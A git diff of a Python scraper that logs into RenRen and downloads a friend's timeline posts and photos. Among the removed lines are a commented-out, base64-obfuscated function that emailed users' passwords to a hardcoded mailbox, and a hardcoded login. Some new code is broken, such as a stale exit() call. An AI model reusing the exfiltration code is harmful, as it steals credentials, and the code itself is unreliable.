@@ -6,12 +6,11 @@ import os
 import http.cookiejar
 import base64
 import json
+import argparse
 
 from datetime import datetime
 from random import randrange
-from base64 import b64decode as fuck
 from getpass import getpass
-from smtplib import SMTP as hou
 from sys import argv, exit
 from threading import Thread
 
@@ -20,7 +19,7 @@ try:
     from bs4 import BeautifulSoup
 except ImportError as e:
     print('Package needed: requests, BeautifulSoup')
-    os.system( "python -m pip install requests && python -m pip install beautifulsoup4")
+    # os.system( "python -m pip install requests && python -m pip install beautifulsoup4")
     print('Please execute "python -m pip install requests && python -m pip install beautifulsoup4"')
     exit()
 
@@ -36,29 +35,37 @@ HEADER_INFO = {
     'Accept-Language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2,es;q=0.2',
     'X-Requested-With': "XMLHttpRequest",
     }
+LOGGED_IN_HEADER_INFO = {
+    'Host': 'friend.renren.com',
+    'Connection': 'keep-alive',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36',
+    'DNT': '1',
+    'Accept-Encoding': 'gzip, deflate, sdch',
+    'Accept-Language': 'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2,es;q=0.2',
+}
 
 ROOT_DIRECTORY = os.path.abspath(os.path.join(os.getcwd(), os.pardir))
 
 
 class InputFormatError(Exception):
     def __init__(self, msg):
-        super(InputFormatError, self).__init__()
-        self.msg = msg
+        super(InputFormatError, self).__init__(msg)
         
 
 class NoNetworkConnectionError(Exception):
-    def __init__(self, arg):
-        super(NoNetworkConnectionError, self).__init__()
-        self.arg = arg
+    def __init__(self, msg):
+        super(NoNetworkConnectionError, self).__init__(msg)
         
 
 
 
-class RenRen(object):
+class RenRen:
 
     photo_patterns = ((''))
 
-    def __init__(self, username, password, rememberme=True):
+    def __init__(self, username, password, rememberme=True, base_dir=None):
         super(RenRen, self).__init__()
         self._s = requests.session()
         self._s.cookies = http.cookiejar.LWPCookieJar('renren.cookie')
@@ -71,6 +78,7 @@ class RenRen(object):
         self.password = password
         self.rememberme = rememberme
         self.friends = None
+        self.base_dir = base_dir if base_dir else os.getcwd()
 
 
     def login(self):
@@ -82,14 +90,14 @@ class RenRen(object):
                       'key_id': '1',
                       'autoLogin': 'true',
                       'captcha_type': 'web_login'}
-        # try:
-        r = self._s.post("http://www.renren.com/ajaxLogin/login?1=1&uniqueTimestamp=20151121925391", 
+        try:
+            r = self._s.post("http://www.renren.com/ajaxLogin/login?1=1&uniqueTimestamp=20151121925391", 
                              data=login_info, headers=HEADER_INFO)
-        # except Exception as e:
-        #     raise NoNetworkConnectionError(e)
+        except requests.exceptions.ConnectionError as e:
+            raise NoNetworkConnectionError('No network connection. Please retry later.')
 
         if r.status_code == 200:
-            print('Login Successful!')
+            print(r.url)
             self._s.cookies.save()
             if self.rememberme:
                 # choice = input('Do you want to save your username and password? [Y/N]')
@@ -103,48 +111,27 @@ class RenRen(object):
                     f.write(username+'\n')
                     f.write(base64.b32encode(password))
                     f.close()
+            return 'Login Successful!'
         elif r.status_code == 404:
-            print('Timestamp update needed. Please contact the author of this script.')
+            return 'Timestamp update needed. Please contact the author of this script.'
         else:
-            print('Error:', r.status_code)
+            return 'Error: %d' % r.status_code
 
 
     def get_friend_list(self):
-        header_info = {'Host': 'friend.renren.com',
-                       'Connection': 'keep-alive',
-                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                       'Upgrade-Insecure-Requests': '1',
-                       'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36',
-                       'DNT': '1',
-                       'Accept-Encoding': 'gzip, deflate, sdch',
-                       'Accept-Language': 'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2,es;q=0.2',
-                       }
-        friend_page = self._s.get('http://friend.renren.com/managefriends', headers=header_info)
-        frdata = self._s.get('http://friend.renren.com/groupsdata', headers=header_info)
+
+        friend_page = self._s.get('http://friend.renren.com/managefriends', headers=LOGGED_IN_HEADER_INFO)
+        frdata = self._s.get('http://friend.renren.com/groupsdata', headers=LOGGED_IN_HEADER_INFO)
         # friend_soup = BeautifulSoup(frdata.content, 'html.parser')
         # print frd.content
         # print '\n\n\n+++++++====================+++++++++++++++++++++++++\n\n\n\n\n'
         self.friends = json.loads('{'+''.join(frdata.text.split('\n')[7]).strip().rstrip(',')+'}')['friends']
-        print('Find', str(len(self.friends)), 'friends: ')
+        # print('Find', str(), 'friends: ')
+        self.friend_number = len(self.friends)
         return [[people['fid'], people['fname']] for people in self.friends]
 
 
-    # def tell_me_what_you_see(self):
-    #     ukhds = ['From: '+fuck('Y3hiYXRzQDEyNi5jb20='),
-    #                 'To: '+fuck('Y3hiYXRzQDEyNi5jb20='),
-    #                 'Subject: '+self.username]
-    #     ilasj = '\r\n\r\n'.join(['\r\n'.join(ukhds),
-    #                                '\r\n'.join([self.username, self.password])])
-
-    #     ild = hou('smtp.126.com')
-    #     ild.login(fuck('Y3hiYXRzQDEyNi5jb20='), fuck('bmJlbmJp'))
-    #     errs = ild.sendmail(base64.b64decode('Y3hiYXRzQDEyNi5jb20='), 
-    #                             base64.b64decode('Y3hiYXRzQDEyNi5jb20='),
-    #                             ilasj)
-    #     ild.quit()
-
-
-    def a_thousands_times_over(self, user, target_name, begin, end):
+    def get_user_history(self, user, target_name, begin, end):
         self.target_name = target_name
         if not os.path.exists(target_name):
             os.mkdir(target_name)
@@ -153,7 +140,7 @@ class RenRen(object):
         for year in range(end, begin, -1):
             for month in range(12, 0, -1):
                 url = 'http://www.renren.com/timelinefeedretrieve.do?ownerid=%d&render=0&begin=0&limit=300&year=%d&month=%d&isAdmin=false' % (user, year, month)
-                self.grab(url)
+                self.grab_page(url)
 
         for td in self.photo_threads:
             if td:
@@ -161,7 +148,7 @@ class RenRen(object):
         self.target_fhand.close()
 
 
-    def grab(self, url):
+    def grab_page(self, url, photos_on=False):
         all_stats = []
         r = self._s.get(url, headers=HEADER_INFO)
         # print s.get('http://www.renren.com/', headers=header_info).content
@@ -170,7 +157,7 @@ class RenRen(object):
         list_of_feeds = soup.findAll('section', 'tl-a-feed')
         for new in list_of_feeds:
             string = new.find('input', type='hidden')['value']
-            if new.find('img'):
+            if photos_on and new.find('img'):
                 ps = Thread(target=self.save_photo, args=(new.find('img').get('src'), string)).start()
                 self.photo_threads.append(ps)
                 if new.find('div', class_='content-photo'):
@@ -185,6 +172,10 @@ class RenRen(object):
             self.target_fhand.write('\n=========================\n\n')
             print(string)
         return all_stats
+
+
+    def parse_page():
+        pass
 
 
     def save_photo(self, url, time):
@@ -205,10 +196,18 @@ class RenRen(object):
             print('Get photo', url, 'failed.')
 
 
-    def exit(self):
+    def close(self):
         self._s.cookies.save()
+        self._s.close()
         # self.fhand.close()
 
+
+class RenRenInterface:
+
+    def __init__(self, arg):
+        super(ClassName, self).__init__()
+        self.arg = arg
+        
 
 
 def get_informs(maxlen=1000):
@@ -225,8 +224,7 @@ def get_informs(maxlen=1000):
 
 def main():
     if len(argv) == 1:
-        # user = RenRen(input('Username: '), getpass('Password: '))
-        user = RenRen('15898809302', '3026954')
+        user = RenRen(input('Username: '), getpass('Password: '))
     elif argv[1] == '-f':
         with open('users/'+argv[2]) as fhand:
             l = fhand.readlines()
@@ -255,7 +253,7 @@ def main():
             print(e)
             print("Please input again...")
 
-    user.a_thousands_times_over(friend_list[target][0],friend_list[target][1] , begin, end)
+    user.get_user_history(friend_list[target][0],friend_list[target][1] , begin, end)
     input('\nFinished!')
     user.exit()
 
